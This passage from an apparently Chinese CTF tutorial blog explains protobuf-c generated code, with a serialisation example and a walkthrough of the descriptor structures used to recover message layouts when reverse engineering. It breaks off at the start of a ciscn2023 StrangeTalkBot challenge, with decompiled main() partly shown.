function_">person__get_packed_size</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person *message)</span></span><br><span class="line">&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;person__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_get_packed_size ((<span class="type">const</span> ProtobufCMessage*)(message));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__pack</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person *message,</span></span><br><span class="line"><span class="params">                      <span class="type">uint8_t</span>       *out)</span></span><br><span class="line">&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;person__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack ((<span class="type">const</span> ProtobufCMessage*)message, out);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__pack_to_buffer</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person *message,</span></span><br><span class="line"><span class="params">                      ProtobufCBuffer *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;person__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack_to_buffer ((<span class="type">const</span> ProtobufCMessage*)message, buffer);</span><br><span class="line">&#125;</span><br><span class="line">Person *</span><br><span class="line">       <span class="title function_">person__unpack</span></span><br><span class="line">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span>               len,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span>       *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (Person *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;person__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>   <span class="title function_">person__free_unpacked</span></span><br><span class="line">                     <span class="params">(Person *message,</span></span><br><span class="line"><span class="params">                      ProtobufCAllocator *allocator)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(!message)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;person__descriptor);</span><br><span class="line">  protobuf_c_message_free_unpacked ((ProtobufCMessage*)message, allocator);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> ProtobufCFieldDescriptor person__field_descriptors[<span class="number">3</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_INT32,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, id),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_STRING,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, name),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line">    PROTOBUF_C_TYPE_STRING,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, email),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> person__field_indices_by_name[] = &#123;</span><br><span class="line">  <span class="number">2</span>,   <span class="comment">/* field[2] = email */</span></span><br><span class="line">  <span class="number">0</span>,   <span class="comment">/* field[0] = id */</span></span><br><span class="line">  <span class="number">1</span>,   <span class="comment">/* field[1] = name */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> ProtobufCIntRange person__number_ranges[<span class="number">1</span> + <span class="number">1</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123; <span class="number">1</span>, <span class="number">0</span> &#125;,</span><br><span class="line">  &#123; <span class="number">0</span>, <span class="number">3</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">const</span> ProtobufCMessageDescriptor person__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Person),</span><br><span class="line">  <span class="number">3</span>,</span><br><span class="line">  person__field_descriptors,</span><br><span class="line">  person__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  person__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) person__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>之后如何使用,我们只需要在自己的代码中引入头文件</p><p>然后便能够引用这些符号进行序列化与反序列化了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;msg.pb-c.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    Person person = PERSON__INIT;</span><br><span class="line">    person.id = <span class="number">1234</span>;</span><br><span class="line">    person.name = <span class="string">&quot;John Doe&quot;</span>;</span><br><span class="line">    person.email = <span class="string">&quot;johndoe@example.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将消息序列化为字节流</span></span><br><span class="line">    <span class="type">size_t</span> len = person__get_packed_size(&amp;person);</span><br><span class="line">    <span class="type">uint8_t</span> *buffer = <span class="built_in">malloc</span>(len);</span><br><span class="line">    person__pack(&amp;person, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将字节流反序列化为消息</span></span><br><span class="line">    Person *new_person = person__unpack(<span class="literal">NULL</span>, len, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印反序列化后的消息</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ID: %d\n&quot;</span>, new_person-&gt;id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, new_person-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Email: %s\n&quot;</span>, new_person-&gt;email);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(buffer);</span><br><span class="line">    person__free_unpacked(new_person, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>对于逆向我们主要关注unpack这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Person *</span><br><span class="line">       <span class="title function_">person__unpack</span></span><br><span class="line">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span>               len,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span>       *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (Person *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;person__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其返回是一个Person指针,所需要的三个参数</p><ul><li>allocator一般不用理会,置0即可</li><li>len是长度,通过<code>person__get_packed_size</code>得到</li><li>data就是指向序列化的字节流</li></ul><p>可以看到<code>person__unpack</code>仅仅是对<code>protobuf_c_message_unpack</code>的封装</p><p>二者之间的差距就在于<code>person__descriptor</code>结构体,其在.c文件中被创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> ProtobufCMessageDescriptor person__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Person),</span><br><span class="line">  <span class="number">3</span>,</span><br><span class="line">  person__field_descriptors,</span><br><span class="line">  person__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  person__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) person__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>查看protobuf-c源码,得到这个结构体的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Magic value checked to ensure that the API is used correctly. */</span></span><br><span class="line"><span class="type">uint32_t</span>magic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"><span class="comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*short_name;</span><br><span class="line"><span class="comment">/** Identifier used in generated C code. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*c_name;</span><br><span class="line"><span class="comment">/** The dot-separated namespace. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*package_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Size in bytes of the C structure representing an instance of this</span></span><br><span class="line"><span class="comment"> * type of message.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">size_t</span>sizeof_message;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `fields`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_fields;</span><br><span class="line"><span class="comment">/** Field descriptors, sorted by tag number. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCFieldDescriptor*fields;</span><br><span class="line"><span class="comment">/** Used for looking up fields by name. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span>*fields_sorted_by_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `field_ranges`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_field_ranges;</span><br><span class="line"><span class="comment">/** Used for looking up fields by id. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCIntRange*field_ranges;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Message initialisation function. */</span></span><br><span class="line">ProtobufCMessageInitmessage_init;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved1;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>magic，一般为0x28AAEEF9</li><li>n_fields，关系到原始的message结构内有几条记录、</li><li>fields，这个指向message内所有记录类型组成的一个数组，可以借此逆向分析message结构。</li></ol><p>如果需要具体分析一个结构体的组成,只需要关注n_fields与fields</p><p>在本例中其这样被初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> ProtobufCFieldDescriptor person__field_descriptors[<span class="number">3</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_INT32,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, id),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_STRING,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, name),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line">    PROTOBUF_C_TYPE_STRING,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, email),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>源码中找到定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>name，名字，变量名</li><li>id，序号，即在message结构体中的顺序（等价于位置）</li><li>label，前面标记的required等标记</li><li>type，数据类型，string还是int64等</li></ol><p>label与type都是枚举类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"><span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line">PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment"> * more than one).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment"> * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment"> * preserved.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment"> * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line">PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line">PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line">PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line">PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line">PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line">PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="ciscn2023-StrangeTalkBot"><a href="#ciscn2023-StrangeTalkBot" class="headerlink" title="ciscn2023-StrangeTalkBot"></a>ciscn2023-StrangeTalkBot</h2><p>程序主流程十分清晰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> v3; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1763(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;unk_A060, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>);</span><br><span class="line">    v3 = read(<span class="number">0</span>, &amp;unk_A060, <span class="number">0x400</span>uLL);</span><br><span class="line">    v4 = (_QWORD *)sub_192D(<span class="number">0LL</span>, v3, &amp;unk_A060);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_155D(v4[<span class="number">3</span>], v4[<span class="number">4</span>], v4[<span class="number">5</span>], v4[<span class="number">6</span>], 